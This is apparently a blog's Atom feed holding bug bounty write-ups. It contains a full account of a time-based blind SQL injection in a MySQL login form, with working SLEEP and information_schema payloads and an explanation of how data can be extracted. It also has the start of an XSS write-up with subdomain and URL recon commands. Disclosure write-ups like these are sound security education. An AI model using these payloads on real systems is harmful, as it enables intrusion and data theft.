<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.io/" rel="alternate" type="text/html" /><updated>2022-10-17T06:28:23+02:00</updated><id>https://hackcommander.io/feed.xml</id><title type="html">hackcommander.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>HackCommander</name></author><entry><title type="html">Time-based SQL injection in a login form</title><link href="https://hackcommander.io/bug-bounty-2/" rel="alternate" type="text/html" title="Time-based SQL injection in a login form" /><published>2022-10-17T00:00:00+02:00</published><updated>2022-10-17T00:00:00+02:00</updated><id>https://hackcommander.io/bug-bounty-2</id><content type="html" xml:base="https://hackcommander.io/bug-bounty-2/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does the payload work?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-3&quot;&gt;3.3. Is it possible to extract information from the database through this type of SQL injections?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.png&quot; alt=&quot;Bug Bounty&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private bug bounty program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post I am going to show the most critical vulnerability I have reported in a bug bounty program so far: a time-based SQL injection in a login form.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;

&lt;p&gt;I found this asset through &lt;a href=&quot;https://leakix.net/&quot;&gt;LeakIX&lt;/a&gt;. LeakIX is an OSINT platform that combines a search engine that indexes public information and an open reporting platform linked to the results. I found this asset making a domain query of the type&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;example.com&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;and I got the following results&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/leakix-results.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;where the colours are ofustating the following info:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;span style=&quot;color:red&quot;&gt;Red&lt;/span&gt;: not important info.&lt;/li&gt;
  &lt;li&gt;&lt;span style=&quot;color:blue&quot;&gt;Blue&lt;/span&gt;: the domain name of the company that I was looking for.&lt;/li&gt;
  &lt;li&gt;&lt;span style=&quot;color:green&quot;&gt;Green&lt;/span&gt;: the IP of the asset.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The asset that I discovered didn’t have a related domain name, it was just an HTTP service on port 80 of an IP, so… Why did leakix return this IP as one of the results?&lt;/p&gt;

&lt;p&gt;That’s because the PHP info page was present in the website and the PHP variable $_SERVER[‘SERVER_ADMIN’] had assigned an email address whose domain was the domain used in the search. Continuing with the example domain, you can think of it as the e-mail address found is something like &lt;strong&gt;admin@example.com&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;As you can see in the following HackerOne report&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/1118898&quot;&gt;PHP info page disclosure report in HackerOne&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;PHP info page disclosure is considered a low criticality vulnerability but a vulnerability should not be underestimated by its scoring. For example, the PHP info page can be used to bypass the HttpOnly flag in the cookies during the exploitation of an XSS to get a session hijacking.&lt;/p&gt;

&lt;p&gt;In this case, PHP info page disclosure has been crucial in finding this vulnerable asset because the HTTP service doesn’t have an related domain and naturally doesn’t have a TLS certificate to indicate that this asset belongs to the company in question. In fact, the company asked me how I had found this asset since they didn’t have it in their inventory.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;

&lt;p&gt;When I accessed to the website, I saw the following landing page&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/landing-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;with the company logo and, when I saw this, I was sure that the asset belonged to the company.&lt;/p&gt;

&lt;p&gt;The website was an operations center for the clients of the company and it looked very simple, in fact Wappalyzer didn’t alert me that any web framework had been used. That’s a very good fact because to not use a web framework is usually less safe than using it.&lt;/p&gt;

&lt;p&gt;As you can see, the website has 2 buttons: one for login and the other one for signing up. The signing up button didn’t work because it was a closed registration website and to sign up on the website it was necessary to send an email to the email address that I have obfuscated with blue color. That was the same email address that appeared in the PHP variable $_SERVER[‘SERVER_ADMIN’] in the results of LeakIX.&lt;/p&gt;

&lt;p&gt;After clicking in the login button I got the following login form&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/login-form.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;but… How did I discover the vulnerability?&lt;/p&gt;

&lt;p&gt;I sent a login request and intercepted it with Burpsuite. Then using the repeater I sent a request with a typical SQL injection payload in the parameter nombre_usuario and I got the following response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/error-500.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The characters such as single quote, hashtag and others are the typical characters that can lead to break the SQL query (in this case, a SQL query to verify the credentials) in the backend, and getting an HTTP error 500 response is the symptom that there could be a SQL injection.&lt;/p&gt;

&lt;p&gt;You can see more info about how to detect SQL injection vulnerabilities in the following link&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/sql-injection&quot;&gt;How to detect SQL injection vulnerabilities&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;An interesting fact is that the parameter password didn’t appear to be vulnerable. We will see why this might be in the section 3.2 but it could be because this parameter is not being entered in the vulnerable query.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;

&lt;p&gt;First of all, it’s necessary to guess what is the DataBase Management System (DBMS), because each of them uses a different syntax. In the following link&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/sql-injection/cheat-sheet&quot;&gt;SQL injection cheat sheet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;you can see different payloads for different DBMS and purposes.&lt;/p&gt;

&lt;p&gt;This is not a CTF so, to discover the DBMS, it’s always best to examine the website well before fuzzing intensely.&lt;/p&gt;

&lt;p&gt;Do you remember the PHP info page disclosure vulnerability? Yes, this page will be useful in this step too, this is the power of a low criticality vulnerability. As you can see in the following screenshot&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/php-info-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;looking at the info.php page I found several references to MySQL. So the DBMS is MySQL.&lt;/p&gt;

&lt;p&gt;After a long time of testing MySQL payloads for different purposes such as login bypass, RCE… Finally the only one that worked was&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user&apos;+OR+(SELECT+SLEEP(0.02))=1#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;which is a time-based SQL injection payload, where the + sign is the URL encoded form of the space character although %20 is valid too. I don’t know why, but there was a change of units in the sleep function, that is, a value of 0.02 in the sleep function produces a delay of approximately 2 seconds (2452 miliseconds) in the response, as you can see in the following screenshot&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/response-delay.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To make sure that the delay was proportional to the input of the sleep function, I sent the following request to the intruder&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/intruder-positions.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;varying the value of the sleep function from 0.01 to 0.09&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/intruder-payloads.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and the result was as follows&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/response-delay-intruder.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;where you can see the payloads in the column “Payload” and the delays in the columns “Response received” and “Response completed”, in miliseconds.&lt;/p&gt;

&lt;p&gt;This is the proof that SQL code is being executed.&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32--why-does-the-payload-work&quot;&gt;3.2.  Why does the payload work?&lt;/h2&gt;

&lt;p&gt;I don’t have the source code of the website but, I think that in the backend there was a MySQL query similar to this&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;nombre_usuario&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I think this because the parameter password didn’t appear to be vulnerable so probably only the parameter nombre_usuario was used in the vulnerable query, that is, the query to get the data of the user. After that, the password retrieved in the query will be compared with the one entered by the user.&lt;/p&gt;

&lt;p&gt;If we enter a “non-malicious” user, such as&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;HackCommander
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the query that will be executed is&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HackCommander&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but if we enter a “malicious” user such as&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;HackCommander&apos; OR (SELECT SLEEP(0.02))=1#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and &lt;strong&gt;the backend no sanitization is being applied in the input&lt;/strong&gt;, the query that will be executed is&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HackCommander&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;would&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;be&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remaining&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and, as you can see, the injected SQL code is executed in the where clause of the query. The reason of the hashtag is that the query could have some code after the evaluation of the parameter username so, to avoid syntax errors, it is a good practice to use the hashtag at the end of the payload, which is the character used in MySQL to write comments.&lt;/p&gt;

&lt;div id=&quot;section-id-3-3&quot; /&gt;

&lt;h2 id=&quot;33-is-it-possible-to-extract-information-from-the-database-through-this-type-of-sql-injections&quot;&gt;3.3. Is it possible to extract information from the database through this type of SQL injections?&lt;/h2&gt;

&lt;p&gt;The answer is &lt;strong&gt;yes&lt;/strong&gt;. But… Where do we get the information if we don’t know the name of any table, attribute…?&lt;/p&gt;

&lt;p&gt;In MySQL, and not only in MySQL, there is an important element to get informacion from the database: the &lt;strong&gt;information schema&lt;/strong&gt;. The information schema (information_schema) is an ANSI-standard set of read-only views that provide information about all of the tables, views, columns, and procedures in a database. You can see more details about information_schema in the following link&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.sqlshack.com/learn-sql-the-information_schema-database/&quot;&gt;Learn SQL: The INFORMATION_SCHEMA Database&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is one of the resources used by Sqlmap to dump the content of a database in blind SQL injections, but this is not a CTF, it’s not a good practice to use Sqlmap on a production asset. In a bug bounty program it’s usually not necessary to dump all the database to get the bounty, it is enough to give a PoC showing how you can get some information from the database. The most simple PoC that I could find was the following&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/number-of-tables-in-the-database.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;using the following payload&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;USER&apos;+OR+(SELECT+IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),&quot;NO&quot;))=1#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This PoC shows that the number of tables in the database is 341. I am going to explain the payload by breaking it down into several points:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.geeksforgeeks.org/mysql-if-function/&quot;&gt;MySQL IF()&lt;/a&gt; is a MySQL function is a function that receives 3 parameters using the following syntax&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;IF(condition, value_if_true, value_if_false)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;and it returns a value if a condition is TRUE, or another value if a condition is FALSE.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;a href=&quot;https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/&quot;&gt;information_schema.tables&lt;/a&gt; is a view that allows to obtain information about all the views and tables of the database. Therefore, the following SQL code&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;select+count(*)+from+information_schema.tables
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;returns the number of tables in the database.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The following SQL code&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;(select+count(*)+from+information_schema.tables)=341
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;compares the number of tables in the database with the number 341.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The following SQL code&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),&quot;NO&quot;))
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;produces a delay of 5 seconds if the number of tables is 341 and returns the string “NO” otherwise.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The above payload needs to be embedded into a SQL query so the following SQL code&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;(SELECT+IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),&quot;NO&quot;))=1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;is SQL query that executes the IF function inside a comparison statement in a select clause.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As you can see in the previous screenshot, the request produces a delay of approximately 5 seconds (5822 miliseconds) so the number of tables in the database is 341. I sent the request to the intruder varying the value from 1 to 500 and the only request that produced a delay was the request with the value 341.&lt;/p&gt;

&lt;p&gt;As you have just seen, it is possible to get information from the database through a time-based SQL injection. This process can be generalized to obtain table names, attributes… character by character, in order to make queries to the really important tables and finally dump all the tables that can be accessed by the user executing the query.&lt;/p&gt;

&lt;p&gt;However, it is not an easy process and although there are tools such as Sqlmap that execute the process automatically, it is not convenient to run this type of tools in a bug bounty program because of the noise they generate and the amount of requests that have to be sent, which could affect the asset. That is why I attached a very simple PoC obtaining only the number of tables in the database.&lt;/p&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;

&lt;p&gt;The asset didn’t have a related domain name but it was an important asset of the company, that is why it was a closed registration website. SQL injection is usually considered a vulnerability of critical severity, especially in this case that I provided a PoC of how this injection could be used to get information from the database. Therefore, the report was classified as&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Asset criticity: High&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Vulnerability severity: Critical&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;and I won the highest bounty of the program.&lt;/p&gt;

&lt;div id=&quot;section-id-5&quot; /&gt;

&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;The reconnaisance step it’s very important, probably the most important one. It’s not a lost of time to use different OSINT tools, like LeakIX.&lt;/li&gt;
  &lt;li&gt;Low criticality vulnerabilities should not be underestimated. Some of them, such as PHP info page disclosure, can lead to dangerous situations or make other vulnerabilities more critical.&lt;/li&gt;
  &lt;li&gt;Blind vulnerabilities, such as blind SQL injection, blind RCE… can be just as dangerous as non-blind vulnerabilities. Although it is not possible to obtain information directly from the response, it can be inferred through various techniques, such as producing delays based on a boolean condition.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>HackCommander</name></author><category term="Bug Bounty" /><category term="web pentesting" /><category term="OSINT" /><category term="LeakIX" /><category term="burpsuite" /><category term="SQL injection" /><category term="MySQL" /><category term="information_schema" /><category term="sqlmap" /><category term="PHP info page" /><summary type="html">Partial disclosure of a bug bounty report: time-based SQL injection in login form.</summary></entry><entry><title type="html">Reflected XSS bypassing HTML tag removal sanitization</title><link href="https://hackcommander.io/bug-bounty-1/" rel="alternate" type="text/html" title="Reflected XSS bypassing HTML tag removal sanitization" /><published>2022-09-20T00:00:00+02:00</published><updated>2022-09-20T00:00:00+02:00</updated><id>https://hackcommander.io/bug-bounty-1</id><content type="html" xml:base="https://hackcommander.io/bug-bounty-1/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does the payload work?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.png&quot; alt=&quot;Bug Bounty&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private bug bounty program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post I am going to show my first relevant report in a bug bounty program: a reflected XSS bypassing HTML tag removal sanitization. This was not my first report but it was the first one where using pentesting tools was not enough and I had to think outside the box.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;

&lt;p&gt;I found this asset through amass + httpx. If you are looking for http services on subdomains of the domain example.com and you have your config file in the path /home/user/.config/amass/config.ini, you can use the following command&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;amass enum -brute -d example.com &apos;/home/user/.config/amass/config.ini&apos; | httpx -title -tech-detect -status-code -ip -p 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6082,6346,6347,7001,7002,8080,8443,8888,30821
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/OWASP/Amass&quot;&gt;Amass&lt;/a&gt; is an OSINT tool to perform network mapping of attack surfaces and external asset discovery which is a very famous tool used in the recon step in bug bounty. The output of the above amass command is a list of subdomains of the given domain, i.e, a list of potential targets.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/projectdiscovery/httpx&quot;&gt;Httpx&lt;/a&gt; is a multi-purpose HTTP toolkit allow to run multiple probers. In this case, the input of httpx is a list of subdomains and the output is a list of subdomains that have an http service in any of the ports given as a parameter. Also it shows some additional information about the service such as the title, the detected technologies… that I have specified in the parameters to be displayed.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;

&lt;p&gt;I found this vulnerability through gau + kxss. If you are looking for XSS in the subdomain www.example.com, you can use the following command&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;gau www.example.com | kxss
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/lc/gau&quot;&gt;Gau&lt;/a&gt; is a tool used to fetch known URLs from AlienVault’s Open Threat Exchange, the Wayback Machine, Common Crawl, and URLScan for any given domain. This tool does not always find all the URLs of a domain but it is a good starting point to search XSS or other types of vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/Emoe/kxss&quot;&gt;Kxss&lt;/a&gt; is a tool used to find all the “problematic characters” that are reflected in the response of any URL given as a parameter. The reflection of some problematic characters does not mean that an XSS exists but it is an indication that it could exist.&lt;/p&gt;

&lt;p&gt;Both tools are based in other tools of &lt;a href=&quot;https://github.com/tomnomnom&quot;&gt;tomnomnom&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In this case I got an output like the following&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2022-09-20-bug-bounty-1/gau-kxss-output.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerable parameter was the typical parameter used to make queries on a website, which usually reflects the word used as a search parameter.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;

